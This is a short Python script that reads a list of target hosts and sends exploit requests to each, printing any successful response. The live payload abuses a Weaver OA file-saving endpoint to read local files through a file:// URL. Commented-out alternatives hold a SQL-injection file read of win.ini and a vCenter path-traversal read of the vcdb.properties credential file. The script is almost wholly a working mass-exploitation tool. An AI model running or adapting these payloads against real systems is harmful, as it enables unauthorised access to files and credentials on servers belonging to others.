import requests


headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
    }

def scan(url:str,poc:str):
    url=url+poc
    print(url)
    try:
        r=requests.get(url,headers=headers,timeout=10,verify=False)
        if r.status_code==200:
            print("success"+url)
            print(r.text)
    except:
        print('not Find')

# poc="/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27"
# payload="/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties"
payload="/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
with open("host.txt","r",encoding="utf-8") as file:
    for url in file:
        if "http://" not in url and "https://" not in url:
            url="http://"+url
        scan(url=url.strip(),poc=payload)
